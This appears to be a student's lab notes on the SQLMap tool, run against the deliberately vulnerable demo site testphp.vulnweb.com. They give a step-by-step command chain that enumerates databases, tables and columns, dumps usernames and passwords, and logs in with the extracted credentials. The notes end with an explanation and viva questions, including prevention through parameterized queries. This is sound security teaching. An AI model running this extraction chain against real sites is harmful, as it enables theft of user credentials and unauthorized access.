@@ -1,0 +1,40 @@
+sudo apt-get install sqlmap
+sqlmap -h
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"
+Tests a specific URL and parameter (artist=1) for a detectable SQL Injection vulnerability.
+
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C uname --dump
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C pass --dump
+
+
+## **Test Login with Extracted Credentials**
+
+**Manual Step:**
+
+- Navigate to: `http://testphp.vulnweb.com/`
+- Username: `test`
+- Password: `test`
+- **Successful login confirmed**
+
+
+Concept: SQLMap is an automated SQL Injection (SQLi) tool. SQL Injection is a web vulnerability where an attacker can "inject" their own SQL database commands into an input field (like a search bar or login form) on a website.
+
+Why We Use It:
+SQLMap automates the entire process of finding an SQLi vulnerability and exploiting it. It can be used by security testers to find flaws, or by attackers to steal data.
+
+Your Experiment:
+You are giving sqlmap a URL that has a vulnerability (?cat=1).
+--dbs: You are asking sqlmap to find and list all the database names on the server.
+--tables -D acuart: After finding a database named acuart, you are asking for all the table names inside that database.
+--columns -T users: After finding a table named users, you are asking for all the column names inside that table (e.g., uname, pass).
+--dump -C uname,pass: Finally, you are telling sqlmap to "dump" (extract and display) all the data from the uname and pass columns in the users table.
+
+Potential Viva Questions:
+Q: What is SQL Injection?
+A: It's a web attack where an attacker inserts malicious SQL code into a query. This can let them bypass logins, view private data, or even delete the entire database.
+
+Q: How do you prevent SQL Injection?
+A: The best method is using Parameterized Queries (or Prepared Statements). This practice treats all user input as data only, never as executable code, which makes injection impossible.
